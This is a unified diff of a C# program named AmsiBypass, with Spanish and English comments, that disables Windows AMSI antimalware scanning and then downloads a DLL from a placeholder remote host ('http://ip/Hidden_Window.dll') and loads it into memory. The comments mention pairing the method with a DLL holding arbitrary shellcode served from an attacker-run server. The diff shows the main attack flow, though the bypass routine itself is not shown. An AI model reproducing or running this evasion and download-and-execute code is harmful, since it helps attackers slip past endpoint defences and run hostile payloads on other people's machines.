@@ -7,12 +7,10 @@ using System.Reflection;
 using System.Runtime.InteropServices;
 
 
-//Third way to bypass AMSI. On this one we inject an Arbitrary DLL too.
-//El DLL usado aqui, Hidden_Window, hace que se cree un .txt con el output del comando sysinfo.
+//way to bypass AMSI. On this one we inject an Arbitrary DLL too.
+//El DLL que se usa aqui, Hidden_Window hace que se cree un .txt con el output del comando sysinfo.
 //Podemos combinar este metodo con un DLL en el que metemos shellcode arbitrario.
-//Tendremos que settear un server, en este caso python, al que este código accederá para descargar la librería y meterla en memoria
-
-
+//Seteate un server para pillar el shellcode
 
 namespace AmsiBypass
 {   
@@ -38,7 +36,7 @@ namespace AmsiBypass
             else
                 BypassAmsi(x64);
             var webClient = new System.Net.WebClient();
-            var data = webClient.DownloadData("http://localhost/Hidden_Window.dll");
+            var data = webClient.DownloadData("http://ip/Hidden_Window.dll");
             try
             {
                 var assembly = Assembly.Load(data);
